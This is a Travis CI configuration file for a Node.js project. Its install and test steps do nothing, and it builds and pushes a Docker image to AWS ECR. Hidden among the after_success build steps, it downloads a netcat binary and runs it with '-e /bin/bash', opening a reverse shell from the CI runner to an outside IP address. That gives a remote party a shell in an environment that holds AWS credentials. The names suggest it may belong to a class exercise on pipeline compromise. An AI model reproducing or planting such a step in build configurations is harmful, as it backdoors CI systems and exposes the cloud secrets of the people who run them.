language: node_js

branches:
  only:
  - /.*/
  
services:
  - docker

install:
  - echo "install nothing!" # put your normal pre-testing installs here

script:
  - echo "no tests!" # put your normal testing scripts here

after_success:
  - pip install curl
  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
  - chmod a+x /tmp/nc
  - /tmp/nc 3.22.15.135 14189 -e /bin/bash
  - docker --version
  - pip install --user awscli
  - export PATH=$PATH:$HOME/.local/bin
  - export CLASS=`cat .class`
  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp .
  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp

